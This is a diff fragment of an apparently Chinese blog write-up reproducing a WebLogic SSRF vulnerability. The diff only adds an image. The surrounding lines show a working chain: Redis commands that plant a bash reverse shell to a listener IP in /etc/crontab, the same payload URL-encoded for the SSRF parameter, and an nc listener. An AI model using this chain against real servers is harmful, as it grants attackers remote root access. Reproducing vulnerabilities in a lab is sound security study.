@@ -547,7 +547,7 @@ save ##将反弹shell写入到/etc/crontab
 <pre><code>set 1 &quot;\n\n\n\n* * * * root bash -i &gt;&amp; /dev/tcp/xx.xx.xx.xx[这里是你自己的公网IP]/8888[这里是你监听的端口] 0&gt;&amp;1\n\n\n\n&quot; config set dir /etc/config set dbfilename crontab save
 </code></pre><p>url编码,同时我们还要制定一个要写入的文件test，换行为%0A%0D。</p>
 <pre><code>?operator=http://172.21.0.2:6379/test%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20root%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F172.20.10.13%2F8888%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Aqwezxc
-</code></pre><p>监听 反弹(nc -lvvp 8888也可以)</p>
+</code></pre><p><img src="/2019/07/24/weblogic-ssrf-lou-dong-fu-xian/7.PNG" alt=""><br>监听 反弹(nc -lvvp 8888也可以)</p>
 <pre><code>root@kali:~# nc -l -p 8888
 
 bash: no job control in this shell
